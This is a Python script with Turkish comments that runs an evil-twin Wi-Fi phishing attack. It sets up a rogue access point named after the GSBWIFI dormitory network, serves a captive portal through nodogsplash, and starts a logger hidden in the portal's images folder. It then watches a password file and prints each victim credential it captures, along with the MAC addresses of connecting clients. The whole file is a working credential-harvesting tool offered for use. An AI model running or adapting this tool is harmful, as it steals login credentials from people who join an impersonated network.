import subprocess
import os
import time
import signal
import sys
import threading
import re
import argparse

# --- AYARLAR & RENKLER ---
GREEN, RED, YELLOW, CYAN, NC = '\033[0;32m', '\033[0;31m', '\033[1;33m', '\033[0;36m', '\033[0m'
PASS_FILE = "/etc/nodogsplash/passwords.txt"
LOGGER_PATH = "/etc/nodogsplash/htdocs/resources/images/logger.py"
print_lock = threading.Lock()
active_clients = set() 

# --- ARGÜMAN YÖNETİMİ ---
parser = argparse.ArgumentParser(description='GSB-WIFI Otomasyon Paneli')
parser.add_argument('-i', '--interface', help='Yayın yapılacak Wi-Fi kartı (örn: wlan0)')
parser.add_argument('-s', '--ssid', default='GSBWIFI', help='Yayınlanacak ağ adı (Varsayılan: GSBWIFI)')
args = parser.parse_args()

def safe_print(msg):
    with print_lock:
        # \r\033[K satırı temizler ve başa döner, mesajı yazar
        sys.stdout.write(f"\r\033[K{msg}\n")
        sys.stdout.flush()

def clean_exit(sig, frame):
    # İmleci yeni satıra al ve ekranı hazırla
    sys.stdout.write(f"\n{YELLOW}[!] Sistem temizleniyor ve DNS onarılıyor...{NC}\n")
    sys.stdout.flush()
    
    # Süreçleri öldür
    subprocess.run(["sudo", "pkill", "-9", "-f", "nodogsplash"], stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "pkill", "-9", "-f", "create_ap"], stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "pkill", "-9", "-f", "logger.py"], stderr=subprocess.DEVNULL)
    
    # Servisleri temizle
    subprocess.run(["sudo", "systemctl", "stop", "dnsmasq"], stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "pkill", "-9", "dnsmasq"], stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "systemctl", "restart", "systemd-resolved"], stderr=subprocess.DEVNULL)
    
    # Terminali tamamen sıfırla ve imleci göster
    os.system('stty sane')
    sys.stdout.write(f"{GREEN}[+] DNS servisi geri yüklendi. Güvenli çıkış yapıldı.{NC}\n")
    sys.stdout.flush()
    os._exit(0)

signal.signal(signal.SIGINT, clean_exit)

def get_interfaces():
    try:
        output = subprocess.check_output(["iw", "dev"], text=True)
        return re.findall(r"Interface\s+(.+)", output)
    except: return []

def password_watcher():
    if not os.path.exists(PASS_FILE): open(PASS_FILE, 'a').close()
    with open(PASS_FILE, "r") as f:
        f.seek(0, os.SEEK_END)
        while True:
            line = f.readline()
            if not line:
                time.sleep(0.5)
                continue
            # Şifre düştüğünde aradaki çizgiyi ve rengi koruyoruz
            safe_print(f"{RED}[!!!] ŞİFRE DÜŞTÜ:{NC}")
            safe_print(f"{GREEN}  > {line.strip()}{NC}")
            safe_print(f"{CYAN}----------------------------------------------{NC}")

def run():
    ifaces = get_interfaces()
    all_sys_ifaces = os.listdir('/sys/class/net')

    os.system('clear')
    print(f"{CYAN}=============================================={NC}")
    print(f"{YELLOW}          GSB-WIFI YÖNETİCİ PANELİ             {NC}")
    print(f"{CYAN}=============================================={NC}")

    if args.interface:
        INTERFACE = args.interface
        if INTERFACE not in all_sys_ifaces:
            print(f"{RED}[!] HATA: Belirtilen kart ({INTERFACE}) sistemde bulunamadı!{NC}")
            return
    else:
        if not ifaces:
            print(f"{RED}[!] Kablosuz kart bulunamadı!{NC}")
            return
        for i, iface in enumerate(ifaces): print(f"  {i+1}) {iface}")
        idx1 = int(input("Yayın Kartı Seçin: ")) - 1
        INTERFACE = ifaces[idx1]

    INTERNET_INT = "lo"
    for iface in all_sys_ifaces:
        if iface != INTERFACE and iface != "lo":
            INTERNET_INT = iface
            break

    os.system('clear')
    safe_print(f"{CYAN}=============================================={NC}")
    safe_print(f"{YELLOW}          GSB-WIFI OPERASYON PANELI             {NC}")
    safe_print(f"{CYAN}=============================================={NC}")
    safe_print(f"[*] SSID: {GREEN}{args.ssid}{NC}")
    safe_print(f"[*] Yayın: {GREEN}{INTERFACE}{NC} | Kaynak: {YELLOW}{INTERNET_INT}{NC}")

    subprocess.run(["sudo", "systemctl", "stop", "systemd-resolved"], stderr=subprocess.DEVNULL)

    safe_print("[*] HTTP Logger başlatılıyor...")
    subprocess.run(["sudo", "pkill", "-f", "logger.py"], stderr=subprocess.DEVNULL)
    subprocess.Popen(["sudo", "python3", LOGGER_PATH], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    safe_print("[*] Ağ oluşturuluyor...")
    cmd = ["sudo", "create_ap", "--no-virt", "-m", "nat", INTERFACE, INTERNET_INT, args.ssid]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)

    time.sleep(4) 
    safe_print("[*] DNS Sorunu gideriliyor (dnsmasq restart)...")
    subprocess.run(["sudo", "systemctl", "restart", "dnsmasq"], stderr=subprocess.DEVNULL)

    safe_print("[*] Captive Portal aktif ediliyor...")
    subprocess.run(["sudo", "pkill", "nodogsplash"], stderr=subprocess.DEVNULL)
    subprocess.Popen(["sudo", "nodogsplash"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    time.sleep(1)
    safe_print(f"{GREEN}[!] SİSTEM HAZIR. Dinleniyor...{NC}")
    safe_print(f"{CYAN}----------------------------------------------{NC}")

    threading.Thread(target=password_watcher, daemon=True).start()

    while True:
        line = proc.stdout.readline()
        if not line: break
        
        line_lower = line.lower()
        mac_m = re.search(r'([a-fA-F0-9]{2}[:|\-]){5}[a-fA-F0-9]{2}', line)
        
        if mac_m:
            mac = mac_m.group().lower()
            if any(x in line_lower for x in ["disconn", "disassoc", "deauth", "expired", "removed"]):
                if mac in active_clients:
                    active_clients.remove(mac)
                    safe_print(f"{RED}[-] BAĞLANTI KESİLDİ: {mac}{NC}")
            elif any(x in line_lower for x in ["assoc", "auth", "connected", "dhcpack"]):
                if "dis" not in line_lower and mac not in active_clients:
                    active_clients.add(mac)
                    safe_print(f"{YELLOW}[+] YENİ BAĞLANTI: {mac}{NC}")

if __name__ == "__main__":
    run()
